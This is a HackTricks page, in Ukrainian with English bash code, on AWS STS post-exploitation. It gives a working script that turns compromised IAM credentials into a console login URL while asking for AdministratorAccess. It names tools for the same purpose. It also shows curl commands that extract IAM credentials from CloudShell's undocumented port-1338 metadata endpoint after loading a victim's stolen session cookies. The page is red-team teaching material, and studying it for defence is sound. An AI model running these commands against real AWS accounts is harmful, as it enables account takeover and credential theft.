# AWS - STS Post Exploitation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## STS

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó:

{% content-ref url="../aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../aws-services/aws-iam-enum.md)
{% endcontent-ref %}

### –í—ñ–¥ IAM Creds –¥–æ –ö–æ–Ω—Å–æ–ª—ñ

–Ø–∫—â–æ –≤–∞–º –≤–¥–∞–ª–æ—Å—è –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–µ—è–∫—ñ IAM –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ, –≤–∏ –º–æ–∂–µ—Ç–µ –±—É—Ç–∏ –∑–∞—Ü—ñ–∫–∞–≤–ª–µ–Ω—ñ –≤ **–¥–æ—Å—Ç—É–ø—ñ –¥–æ –≤–µ–±-–∫–æ–Ω—Å–æ–ª—ñ** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞—Å—Ç—É–ø–Ω–∏—Ö —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤.\
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á/—Ä–æ–ª—å –ø–æ–≤–∏–Ω–Ω—ñ –º–∞—Ç–∏ –¥–æ–∑–≤—ñ–ª **`sts:GetFederationToken`**.

#### –ö–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–∏–π —Å–∫—Ä–∏–ø—Ç

–ù–∞—Å—Ç—É–ø–Ω–∏–π —Å–∫—Ä–∏–ø—Ç –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏–º–µ –ø—Ä–æ—Ñ—ñ–ª—å –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —Ç–∞ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–µ –º—ñ—Å—Ü–µ–∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è AWS (–Ω–µ gov —ñ –Ω–µ cn), —â–æ–± –Ω–∞–¥–∞—Ç–∏ –≤–∞–º –ø—ñ–¥–ø–∏—Å–∞–Ω–µ URL, —è–∫–µ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –≤—Ö–æ–¥—É –≤ –≤–µ–±-–∫–æ–Ω—Å–æ–ª—ñ:

{% code overflow="wrap" %}
```bash
# Get federated creds (you must indicate a policy or they won't have any perms)
## Even if you don't have Admin access you can indicate that policy to make sure you get all your privileges
## Don't forget to use [--profile <prof_name>] in the first line if you need to
output=$(aws sts get-federation-token --name consoler --policy-arns arn=arn:aws:iam::aws:policy/AdministratorAccess)

if [ $? -ne 0 ]; then
echo "The command 'aws sts get-federation-token --name consoler' failed with exit status $status"
exit $status
fi

# Parse the output
session_id=$(echo $output | jq -r '.Credentials.AccessKeyId')
session_key=$(echo $output | jq -r '.Credentials.SecretAccessKey')
session_token=$(echo $output | jq -r '.Credentials.SessionToken')

# Construct the JSON credentials string
json_creds=$(echo -n "{\"sessionId\":\"$session_id\",\"sessionKey\":\"$session_key\",\"sessionToken\":\"$session_token\"}")

# Define the AWS federation endpoint
federation_endpoint="https://signin.aws.amazon.com/federation"

# Make the HTTP request to get the sign-in token
resp=$(curl -s "$federation_endpoint" \
--get \
--data-urlencode "Action=getSigninToken" \
--data-urlencode "SessionDuration=43200" \
--data-urlencode "Session=$json_creds"
)
signin_token=$(echo -n $resp | jq -r '.SigninToken' | tr -d '\n' | jq -sRr @uri)



# Give the URL to login
echo -n "https://signin.aws.amazon.com/federation?Action=login&Issuer=example.com&Destination=https%3A%2F%2Fconsole.aws.amazon.com%2F&SigninToken=$signin_token"
```
{% endcode %}

#### aws\_consoler

–í–∏ –º–æ–∂–µ—Ç–µ **–∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ –≤–µ–±-–∫–æ–Ω—Å–æ–ª—å** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é [https://github.com/NetSPI/aws\_consoler](https://github.com/NetSPI/aws\_consoler).
```bash
cd /tmp
python3 -m venv env
source ./env/bin/activate
pip install aws-consoler
aws_consoler [params...] #This will generate a link to login into the console
```
{% hint style="warning" %}
–ü–µ—Ä–µ–∫–æ–Ω–∞–π—Ç–µ—Å—è, —â–æ IAM –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–∞—î –¥–æ–∑–≤—ñ–ª `sts:GetFederationToken`, –∞–±–æ –Ω–∞–¥–∞–π—Ç–µ —Ä–æ–ª—å –¥–ª—è –ø—Ä–∏–π–Ω—è—Ç—Ç—è.
{% endhint %}

#### aws-vault

[**aws-vault**](https://github.com/99designs/aws-vault) - —Ü–µ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –±–µ–∑–ø–µ—á–Ω–æ–≥–æ –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è —Ç–∞ –¥–æ—Å—Ç—É–ø—É –¥–æ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö AWS —É —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ —Ä–æ–∑—Ä–æ–±–∫–∏.
```bash
aws-vault list
aws-vault exec jonsmith -- aws s3 ls # Execute aws cli with jonsmith creds
aws-vault login jonsmith # Open a browser logged as jonsmith
```
{% hint style="info" %}
–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **aws-vault** –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è **—Å–µ—Å—ñ—ó –∫–æ–Ω—Å–æ–ª—ñ –±—Ä–∞—É–∑–µ—Ä–∞**
{% endhint %}

#### –í—ñ–¥ –∫–æ–Ω—Å–æ–ª—ñ –¥–æ IAM –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö

[**–°–ø–æ—á–∞—Ç–∫—É –≤–∏—è–≤–ª–µ–Ω–æ –≤ —Ü—å–æ–º—É –ø–æ—Å—Ç—ñ**](https://blog.christophetd.fr/retrieving-aws-security-credentials-from-the-aws-console/), —è–∫—â–æ –≤–∞–º –≤–¥–∞—Å—Ç—å—Å—è —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –≤–µ–±-–∫–æ–Ω—Å–æ–ª—ñ (–º–æ–∂–ª–∏–≤–æ, –≤–∏ –≤–∫—Ä–∞–ª–∏ –∫—É–∫–∏ —ñ –Ω–µ –∑–º–æ–≥–ª–∏ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –ø–∞–ø–∫–∏ .aws), –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–µ—è–∫—ñ —Ç–æ–∫–µ–Ω–∏ IAM –¥–ª—è —Ü—å–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —á–µ—Ä–µ–∑ **CloudShell**.

CloudShell –≤—ñ–¥–∫—Ä–∏–≤–∞—î IAM –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ —á–µ—Ä–µ–∑ **–Ω–µ–¥–æ–∫—É–º–µ–Ω—Ç–æ–≤–∞–Ω–∏–π –∫—ñ–Ω—Ü–µ–≤–∏–π –ø—É–Ω–∫—Ç –Ω–∞ –ø–æ—Ä—Ç—É 1338**. –ü—ñ—Å–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Å–µ—Å—ñ–π–Ω–∏—Ö –∫—É–∫—ñ–≤ –∂–µ—Ä—Ç–≤–∏ —É –≤–∞—à –±—Ä–∞—É–∑–µ—Ä, –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–π—Ç–∏ –¥–æ CloudShell —ñ –≤–∏–∫–æ–Ω–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ –∫–æ–º–∞–Ω–¥–∏, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ IAM –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ.
```bash
TOKEN=$(curl -X PUT localhost:1338/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl localhost:1338/latest/meta-data/container/security-credentials -H "X-aws-ec2-metadata-token: $TOKEN"
```
{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
